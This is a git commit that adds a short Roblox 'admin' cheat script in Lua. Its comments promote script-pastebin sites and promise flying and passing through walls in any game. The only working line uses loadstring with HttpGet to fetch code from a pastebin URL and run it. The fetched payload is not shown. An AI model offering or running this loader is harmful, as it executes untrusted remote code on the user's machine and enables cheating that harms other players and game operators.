a469f0b06828d508a9c4f83ffa4e97bd6a76cba9
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-26 06:58:57 +0100

    commit zero

---
+++ No Name Script pastebin roblox Reviz Admin .lua
@@ -0,0 +1,13 @@
+-- find more powerfull verified and New Scripts here : https://script-pastebin.com
+
+loadstring(game:HttpGet('https://pastebin.com/ibFPdiF7'))()
+
+-- find more powerfull verified and New Scripts here : https://scriptpastebin.io
+
+--[[ Script Description:
+
+							The script is made for absolutely any game, this script will give you all the features of the admin panel
+such as flying
+passing through walls and more
+						
+]]
